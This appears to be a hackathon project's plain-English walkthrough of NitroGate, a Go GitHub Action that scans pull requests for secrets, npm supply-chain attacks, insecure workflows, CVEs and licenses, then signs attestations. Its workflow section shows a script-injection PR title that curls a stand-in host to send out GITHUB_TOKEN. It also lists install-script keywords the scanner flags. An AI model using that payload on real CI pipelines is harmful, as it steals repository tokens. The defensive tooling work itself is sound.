# NitroGate — How It All Works (Start to Finish)

> A plain-English walkthrough of every piece of NitroGate, why it exists, and how it helps.

---

## The Story in 30 Seconds

A developer opens a pull request. NitroGate automatically scans it for security problems — leaked secrets, dangerous npm packages, insecure CI workflows, vulnerable dependencies, bad licenses. It makes a decision: **PASS**, **FAIL**, or **ADVISORY**. Then it signs that decision cryptographically (so nobody can fake it), posts a comment on the PR, and sends the result to a graph database called GUAC so your entire org can see which repos are healthy and which aren't.

That's it. Everything below is the "how."

---

## Part 1: The Problem We're Solving

### Why do we need this?

Think about what happens today when someone opens a PR:

1. **Secrets get committed.** A developer accidentally pushes an AWS key. Nobody catches it until the AWS bill spikes or the key shows up on GitHub's public leak database. By then, attackers have already used it.

2. **Bad npm packages slip in.** Someone adds `event-stream` (a package that was hijacked in 2018 to steal Bitcoin). Or they misspell `lodash` as `lodsah` and install a malicious typosquatting package. There's no check for this.

3. **CI workflows are insecure.** Most GitHub Actions workflows are vulnerable to script injection — where an attacker crafts a PR title that executes arbitrary commands in your CI. Almost nobody checks for this.

4. **Dependencies have known CVEs.** A PR adds `lodash@4.17.20` which has a known command injection vulnerability. The developer doesn't know. There's no automated check.

5. **No proof anything was checked.** Even if you run security tools, there's no cryptographic proof of what was scanned, what was found, and what the result was. It's just "trust me, CI passed."

6. **No org-wide picture.** When a new CVE drops, the security team asks "which of our 200 repos use this package?" Nobody can answer quickly.

NitroGate solves all six of these problems with one tool.

---

## Part 2: The Architecture (What Runs When)

Here's what happens step by step when a PR is opened:

```
Developer pushes code → PR created/updated
                ↓
GitHub triggers the NitroGate Action
                ↓
NitroGate binary starts (Go, ~9MB, runs in Docker)
                ↓
Step 1: Load the policy file (.nitrogate.json)
        This tells NitroGate what to check and how strict to be.
                ↓
Step 2: Fetch PR data from GitHub API
        - Which files changed
        - The full diff (what lines were added/removed)
        - Base and head commit SHAs
                ↓
Step 3: Run 5 scanners IN PARALLEL (this is fast — ~2 seconds)
        ┌──────────────┐
        │ Secrets      │  → Regex patterns + entropy
        │ Dependencies │  → Parse lockfiles + query OSV.dev
        │ NPM Supply   │  → Compromised/typosquat/cooldown
        │ Workflows    │  → Script injection / Pwn Request
        │ Licenses     │  → Check against denied list
        └──────────────┘
                ↓
Step 4: Gate Evaluator collects all findings
        - Counts by severity (critical, high, medium, low)
        - Applies threshold from policy
        - Makes the decision: PASS / FAIL / ADVISORY
                ↓
Step 5: Build an in-toto attestation
        - Standard format used by Google, GitHub, SLSA
        - Contains: what was scanned, what was found, the decision
                ↓
Step 6: Sign the attestation with Ed25519
        - Creates a cryptographic signature
        - Anyone can verify it later — proves it wasn't tampered with
                ↓
Step 7: Post a PR comment with all findings
        - Markdown table with severity icons
        - Remediation advice for each finding
        - Summary at the bottom
                ↓
Step 8: Push results to GUAC (if enabled)
        - GraphQL mutation → stores in graph database
        - Enables org-wide queries later
                ↓
Step 9: Upload artifacts (JSON files)
        - gate-result.json, attestation.json, findings.json
        - Available as GitHub Action artifacts
```

---

## Part 3: Each Piece Explained

### 3.1 The Policy File (`.nitrogate.json`)

**What it is:** A JSON config file in your repo root that tells NitroGate what to check and how strict to be.

**Why we need it:** Different repos have different needs. A payments service needs strict security. A docs site can be more relaxed. The policy lets each repo customize.

**How it helps:** Instead of a one-size-fits-all tool, teams control their own security posture. Zero arguments about false positives — just adjust the policy.

```json
{
  "mode": "gate",           // "gate" = block the PR, "advisory" = warn only
  "secrets": {
    "enabled": true,
    "allowFiles": ["**/*.test.*"]   // don't flag test fixtures
  },
  "dependencies": {
    "enabled": true,
    "npmSupplyChain": {
      "cooldownDays": 7,            // flag packages published < 7 days ago
      "checkCompromised": true       // check against known-bad list
    }
  }
}
```

**Key design choice:** If no policy file exists, NitroGate uses sensible defaults (advisory mode, all scanners enabled). Zero config to get started.

---

### 3.2 Secret Scanner (`internal/scanner/secrets.go`)

**What it does:** Scans the `+` lines (newly added code) in the PR diff for leaked credentials.

**Why we need it:** Secrets in code are the #1 cause of cloud breaches. Once a secret is committed, even if you delete it in the next commit, it lives in git history forever. Attackers scrape GitHub for leaked keys in real time.

**How it works:**
1. **17 regex patterns** match specific credential formats:
   - `AKIA[0-9A-Z]{16}` catches AWS Access Keys
   - `ghp_[a-zA-Z0-9]{36}` catches GitHub Personal Access Tokens
   - `-----BEGIN RSA PRIVATE KEY-----` catches private key files
   - And 14 more for Slack, Stripe, Google, databases, JWTs, etc.

2. **Shannon entropy detection** catches things regex can't. If a string has high randomness (entropy > 4.5), it's probably a key or token. This catches custom API keys that don't match any known pattern.

3. **File allowlisting** skips test files (`*.test.*`, `*.spec.*`) so your test fixtures with fake keys don't trigger false alarms.

4. **Redaction** — detected values are never shown in full. The PR comment shows `AKIA***REDACTED***`, not the actual key. The attestation also only contains the redacted version.

**Why Go:** Go's `regexp` package is compiled, so matching 17 patterns across thousands of diff lines is fast (~5ms).

---

### 3.3 NPM Supply Chain Scanner (`internal/scanner/npm_supply_chain.go`)

**What it does:** Detects four types of npm supply chain attacks.

**Why we need it:** npm has the largest package ecosystem (~2M packages). This makes it the biggest attack surface. Real attacks happen monthly.

**How it works:**

**1. Compromised Package Detection**
- Maintains a list of 16 known-compromised packages: `event-stream`, `ua-parser-js`, `colors`, `faker`, `node-ipc`, etc.
- If your PR adds any of these, it's an instant CRITICAL finding.
- **Why:** In 2018, `event-stream` was hijacked. The attacker added a dependency that stole Bitcoin wallet keys from the Copay app. This affected millions of users.

**2. Typosquatting Detection**
- Uses Levenshtein distance (edit distance) to compare new package names against 60+ popular packages.
- If `lodsah` is added and its edit distance from `lodash` is <= 2, NitroGate flags it.
- Also checks common patterns: extra hyphens (`lodash-js`), removed hyphens (`reactdom`), scope squatting.
- **Why:** Attackers register packages with names similar to popular ones. `crossenv` (malicious) vs `cross-env` (real).

**3. Cooldown Period**
- Queries the npm registry API to check when a package version was published.
- If it was published within the last N days (default: 7), NitroGate flags it as MEDIUM.
- **Why:** Most supply chain attacks are detected within a few days. Waiting a week before adopting a new version gives the community time to spot problems.

**4. Suspicious Install Scripts**
- Checks if `package.json` has `preinstall`, `install`, or `postinstall` scripts.
- Flags scripts containing `curl`, `wget`, `eval`, `base64`, `exec` — common in malware.
- **Why:** Install scripts run automatically when you `npm install`. Attackers use them to download and execute malware.

---

### 3.4 Workflow Security Scanner (`internal/scanner/workflow.go`)

**What it does:** Scans GitHub Actions workflow YAML files for security vulnerabilities.

**Why we need it:** GitHub Actions runs code with access to your repo, secrets, and tokens. A vulnerable workflow is a backdoor into your codebase. Most teams don't audit their CI configurations.

**How it works:**

**1. Script Injection (CRITICAL)**
- Detects when `${{ github.event.pull_request.title }}` (or `.body`, `.comment.body`, etc.) is used inside a `run:` block.
- **Why this is dangerous:** An attacker sets their PR title to: `"; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "`
- The `run:` step becomes: `echo "PR Title: "; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo ""`
- This executes arbitrary commands with the workflow's permissions.
- **Fix:** Use `env:` variables instead of inline expressions.

**2. Pwn Request (CRITICAL)**
- Detects workflows that use `pull_request_target` AND check out the PR head code.
- **Why this is dangerous:** `pull_request_target` runs with write access to the *base* repo. If it checks out and runs code from the PR (which is from a fork), the attacker's code runs with full write access to your repo.
- This is how major repos have been compromised.

**3. Unpinned Actions (MEDIUM)**
- Flags `uses: some-org/action@main` or `uses: some-org/action@v1`.
- **Why:** If the action repo is compromised, `@main` or `@v1` would pull the malicious version. SHA pinning (`@abc123def`) is immutable.
- Trusted orgs (like `actions`, `github`) are skipped.

**4. Excessive Permissions (MEDIUM)**
- Flags `permissions: write-all` or overly broad permission grants.
- **Why:** Least privilege. A CI job that only needs to read code and write PR comments shouldn't have `write-all`.

---

### 3.5 Dependency Scanner (`internal/scanner/deps.go`)

**What it does:** Parses dependency lockfiles from the PR diff and checks each package against the OSV.dev vulnerability database.

**Why we need it:** New CVEs are published daily. Developers don't manually check if `lodash@4.17.20` has a known command injection vulnerability. This scanner does it automatically.

**How it works:**
1. Extracts package names and versions from lockfiles (supports npm, Go, Python, Rust, Ruby)
2. Sends batch queries to OSV.dev API (`POST /v1/query`)
3. Maps OSV severity to NitroGate severity levels
4. Reports findings with CVE ID, affected version, and fix version

**Why OSV.dev:** It's Google-backed, covers 470,000+ vulnerabilities across all ecosystems, and is completely free. It aggregates data from NVD, GitHub Security Advisories, PyPI Advisory, and more.

---

### 3.6 License Scanner (`internal/scanner/license.go`)

**What it does:** Checks the license of newly added dependencies against your policy.

**Why we need it:** If your company ships a SaaS product and a developer adds an AGPL-3.0 dependency, you may be legally required to release your entire source code. This is a business-ending mistake that's easy to prevent.

**How it works:**
1. Detects new dependencies from the PR diff
2. Queries package registries (npm, PyPI) for the package's license
3. Classifies: Permissive (MIT, Apache) = PASS, Copyleft (LGPL) = WARN, Strong copyleft (GPL, AGPL) = FAIL
4. Unknown licenses are flagged for manual review

---

### 3.7 Gate Evaluator (`internal/gate/gate.go`)

**What it does:** Takes all findings from all scanners and makes the final PASS / FAIL / ADVISORY decision.

**Why we need it:** Individual scanners produce findings, but you need a single "should this PR be blocked?" answer. The gate evaluator is that answer.

**How it works:**
1. Counts findings by severity (critical, high, medium, low, info)
2. Checks each finding against the policy's severity threshold
3. If any finding is at or above the threshold:
   - In `gate` mode → **FAIL** (PR is blocked)
   - In `advisory` mode → **ADVISORY** (PR gets a warning comment but isn't blocked)
4. If no findings meet the threshold → **PASS**

**Two modes:**
- `"gate"` — Hard block. The PR cannot merge if there are critical/high findings. Use for payment services, auth systems.
- `"advisory"` — Soft warning. The PR gets a detailed comment but can still merge. Use for docs, internal tools.

---

### 3.8 In-toto Attestation (`internal/attest/intoto.go`)

**What it is:** A structured JSON document that records exactly what NitroGate checked and what it found.

**Why we need it:** Without attestations, gate results are just ephemeral CI logs. With attestations, you have **cryptographic proof** of:
- What repo and PR was scanned
- What scanners ran
- What findings were detected
- What the gate decision was
- When it happened
- Who signed it

This is useful for:
- **Compliance auditing** — "Prove that every PR in Q1 2026 was scanned before merge"
- **Incident response** — "What was the gate result when this PR was merged?"
- **Supply chain transparency** — Third parties can verify your security posture

**Why in-toto v1:** It's the industry standard used by Google (SLSA), GitHub (Sigstore), the CNCF, and GUAC. Using the standard format means our attestations are compatible with the entire ecosystem.

**The format:**
```json
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [{ "name": "myorg/myrepo", "digest": {"sha256": "..."} }],
  "predicateType": "https://nitrogate.dev/attestation/review/v1",
  "predicate": {
    "gate": { "decision": "FAIL", "summary": { "criticalCount": 2 } },
    "scanners": [
      { "name": "secrets", "findings": 1 },
      { "name": "npm-supply-chain", "findings": 2 }
    ],
    "evidence": { "repo": "myorg/myrepo", "pr": 42 },
    "timestamp": "2026-03-03T10:00:00Z"
  }
}
```

---

### 3.9 Ed25519 Signing (`internal/attest/sign.go`)

**What it does:** Takes the attestation and signs it with Ed25519, creating a DSSE (Dead Simple Signing Envelope).

**Why we need it:** Without a signature, anyone could modify the attestation to change "FAIL" to "PASS". The signature makes it tamper-evident — if a single byte changes, verification fails.

**Why Ed25519:**
- **Fast** — signing takes microseconds
- **Small keys** — 32 bytes (vs 256+ for RSA)
- **No dependencies** — built into Go's standard library (`crypto/ed25519`)
- **Deterministic** — same input always produces same signature (easier to test)

**How it works:**
1. The attestation JSON is base64-encoded (the "payload")
2. A PAE (Pre-Authentication Encoding) is computed: `DSSEv1 + payloadType + payload`
3. Ed25519 signs the PAE
4. The signature and public key are bundled into a DSSE envelope

**Verification:** Anyone with the public key (embedded in every attestation) can verify:
```
payload → PAE → Ed25519 verify with public key → true/false
```

If someone tampers with the attestation (changes "FAIL" to "PASS"), the PAE changes, and verification returns `false`.

---

### 3.10 PR Comment (`internal/output/comment.go`)

**What it does:** Generates a beautiful Markdown comment that gets posted on the PR.

**Why we need it:** Developers don't read JSON artifacts. They read PR comments. The comment gives immediate, actionable feedback right where the developer is working.

**What it includes:**
- Gate decision (PASS/FAIL/ADVISORY) with icon
- Each scanner's results with finding count and duration
- Top 5 findings per scanner with severity, detail, file location, and remediation
- Summary table with counts by severity
- Attestation status (SIGNED / SKIPPED)
- A hidden HTML marker (`<!-- nitrogate-review -->`) so NitroGate can update the comment on subsequent pushes instead of creating duplicates

---

### 3.11 GUAC Integration (`internal/guac/client.go`)

**What it is:** [GUAC](https://github.com/guacsec/guac) (Graph for Understanding Artifact Composition) is a graph database from Google that aggregates software security metadata.

**Why we need it:** Individual PR scanning is great, but it doesn't answer organizational questions:
- "Which repos across the org have failing quality gates right now?"
- "Which repos use lodash@4.17.20 (the vulnerable version)?"
- "Show me every PR that was merged this month without a passing gate"
- "What's the security posture of all our repos?"

Without GUAC, answering these questions requires manually checking each repo. With GUAC, it's one GraphQL query.

**How it works:**
1. NitroGate makes a GraphQL mutation to GUAC after each scan
2. It first creates a "package" node for the repo (`ingestPackage`)
3. Then adds metadata (`ingestHasMetadata`) with:
   - `nitrogate:decision` = "PASS" or "FAIL"
   - `nitrogate:pr` = the PR number
   - `nitrogate:critical-findings` = count of critical findings
4. GUAC stores this in its in-memory graph (or PostgreSQL in production)

**The killer query:**
```graphql
{
  HasMetadata(hasMetadataSpec: {key: "nitrogate:decision", value: "FAIL"}) {
    justification
    subject { ... on Package { namespaces { names { name } } } }
  }
}
```
→ Returns every repo in the org with a failing gate, plus what was wrong.

**Why GUAC and not a custom database:** GUAC is becoming the industry standard for software supply chain metadata. It's backed by Google, used by the CNCF, and understands in-toto attestations natively. Building on GUAC means NitroGate's data is compatible with every other supply chain tool in the ecosystem.

---

## Part 4: Why We Chose Go

| Reason | Detail |
|---|---|
| **Ecosystem** | GUAC, cosign, in-toto-go, Witness, SLSA tools are all Go. We can import directly. |
| **Single binary** | `go build` produces one 9MB binary. No runtime, no npm install, no Python venv. |
| **Fast startup** | Cold start in Docker Action is ~200ms. Node.js would be 2-3 seconds. |
| **Native crypto** | `crypto/ed25519` is in the standard library. No dependencies for signing. |
| **Parallelism** | Goroutines make running 5 scanners concurrently trivial. |
| **Type safety** | Catches bugs at compile time, not at runtime in production. |

---

## Part 5: How Everything Connects

```
.nitrogate.json (your policy)
        │
        ▼
┌─── NitroGate (Go binary, 9MB) ───────────────────────┐
│                                                        │
│   Load policy → Fetch PR → Run scanners → Gate eval    │
│                     │                         │        │
│                     │    ┌────────────────────┐│        │
│                     │    │ OSV.dev API        ││        │
│                     │    │ npm Registry API   ││        │
│                     │    │ PyPI API           ││        │
│                     │    └────────────────────┘│        │
│                                               │        │
│             Sign attestation (Ed25519)         │        │
│                     │                         │        │
│         ┌───────────┼───────────┐             │        │
│         ▼           ▼           ▼             │        │
│   PR Comment   Artifacts    GUAC Push         │        │
│   (GitHub)     (.json)    (GraphQL)           │        │
└────────────────────────────────────────────────┘

Later, anyone can:
- Read the PR comment (developer)
- Download artifacts and verify the signature (auditor)
- Query GUAC for org-wide status (security team)
```

---

## Part 6: The Files

Here's every important file and what it does:

### Go Source (the engine)

| File | Purpose |
|---|---|
| `cmd/nitrogate/main.go` | Entry point. Orchestrates the entire pipeline: load policy → fetch PR → run scanners → evaluate gate → sign → comment → push to GUAC |
| `internal/scanner/types.go` | Core types: `Finding`, `Severity` (Info/Low/Medium/High/Critical), `ScanResult`, `Scanner` interface |
| `internal/scanner/secrets.go` | Secret scanner: 17 regex patterns + Shannon entropy detection |
| `internal/scanner/npm_supply_chain.go` | NPM supply chain: compromised list, typosquatting (Levenshtein), cooldown, install scripts |
| `internal/scanner/workflow.go` | Workflow security: script injection, Pwn Request, unpinned actions, excessive permissions |
| `internal/scanner/deps.go` | Dependency scanner: lockfile parsing + OSV.dev API queries |
| `internal/scanner/license.go` | License scanner: registry API lookups + policy enforcement |
| `internal/gate/gate.go` | Gate evaluator: aggregates findings → PASS/FAIL/ADVISORY |
| `internal/attest/intoto.go` | Builds in-toto v1 attestation statements |
| `internal/attest/sign.go` | Ed25519 signing and DSSE envelope creation |
| `internal/policy/policy.go` | Loads `.nitrogate.json`, applies defaults, provides config to scanners |
| `internal/guac/client.go` | GUAC GraphQL client: ingestPackage, ingestHasMetadata, queries |
| `internal/output/comment.go` | Generates the Markdown PR comment and writes JSON artifacts |

### Config & Deployment

| File | Purpose |
|---|---|
| `.nitrogate.json` | Policy file (what to scan, how strict) |
| `action-v2.yml` | GitHub Action definition (inputs, outputs, env vars) |
| `Dockerfile` | Builds Go binary into an Alpine Docker image |
| `.github/workflows/nitrogate.yml` | Example workflow for repos that use NitroGate |
| `deploy/guac-demo-compose.yaml` | Docker Compose to run GUAC locally |

### Tests

| File | What It Tests |
|---|---|
| `internal/scanner/secrets_test.go` | Pattern detection, entropy, redaction, file allowlisting |
| `internal/scanner/npm_supply_chain_test.go` | Compromised detection, Levenshtein distance, typosquatting |
| `internal/scanner/workflow_test.go` | Script injection, Pwn Request, unpinned actions, permissions |
| `internal/gate/gate_test.go` | PASS/FAIL/ADVISORY logic, severity thresholds, multiple scanners |
| `internal/attest/sign_test.go` | Sign → verify round-trip, tamper detection, invalid key handling |
| `test-guac/generate_attestation.go` | Generates test attestation + SBOM for GUAC demo |

---

## Part 7: How to Test Everything

### Quick (30 seconds, no Docker)

```bash
cd /path/to/nitrogate
go test ./internal/... -v
```

This runs all unit tests: secrets detection, NPM supply chain, workflow security, gate logic, attestation signing. No network or Docker needed.

### Full Demo (5 minutes, needs Docker)

```bash
# 1. Build the binary
go build -o bin/nitrogate ./cmd/nitrogate/

# 2. Start GUAC
cd deploy && docker compose -f guac-demo-compose.yaml -p guac up -d && cd ..

# 3. Run the full simulation
./examples/07-full-pr-simulation/simulate.sh

# 4. Run the GUAC demo (ingests 3 repos, queries back)
./examples/06-guac-integration/demo-queries.sh

# 5. Cleanup
docker compose -f deploy/guac-demo-compose.yaml -p guac down
```

### On a Real GitHub Repo

1. Create a GitHub org called `nitrogate` (free)
2. Create a test repo
3. Copy `.nitrogate.json` and `.github/workflows/nitrogate.yml` from `examples/07-full-pr-simulation/`
4. Add a signing key secret: `openssl rand -base64 32` → repo secret `NITRO_SIGNING_KEY_B64`
5. Open a PR with bad code (use files from the examples)
6. Watch NitroGate comment on the PR

---

## Part 8: What Problem Does Each Piece Solve?

| Component | Problem It Solves | Without It |
|---|---|---|
| **Secret Scanner** | Credentials leaked in code | AWS bills spike, accounts compromised |
| **NPM Supply Chain** | Malicious packages installed | Crypto miners, data theft, ransomware |
| **Workflow Security** | CI/CD exploitation | Repo takeover, secret exfiltration |
| **Dependency Scanner** | Known CVEs in production | Vulnerable services, compliance failures |
| **License Scanner** | Incompatible licenses | Legal liability, forced open-sourcing |
| **Gate Evaluator** | No single pass/fail answer | "Which of 10 checks matter?" confusion |
| **In-toto Attestation** | No proof of what was checked | "Trust me, CI passed" — unverifiable |
| **Ed25519 Signing** | Attestation tampering | Fake PASS results, audit fraud |
| **PR Comment** | Developers don't read CI logs | Issues ignored until production |
| **GUAC Integration** | No org-wide visibility | Manual triage during incidents |
| **Policy File** | One size doesn't fit all | Too strict or too loose for each repo |

---

## Part 9: The Hackathon Pitch (2 Sentences)

> NitroGate is a supply chain quality gate that runs on every PR — catching leaked secrets, compromised npm packages, insecure CI workflows, and vulnerable dependencies in seconds — then signs the results cryptographically and feeds them into GUAC so you can ask "which repos across the org are at risk?" with one query.

> We built it in Go with 2,800 lines of code, 23+ passing tests, 5 parallel scanners, Ed25519-signed in-toto attestations, and a working GUAC integration that demos cross-repo security intelligence in real time.
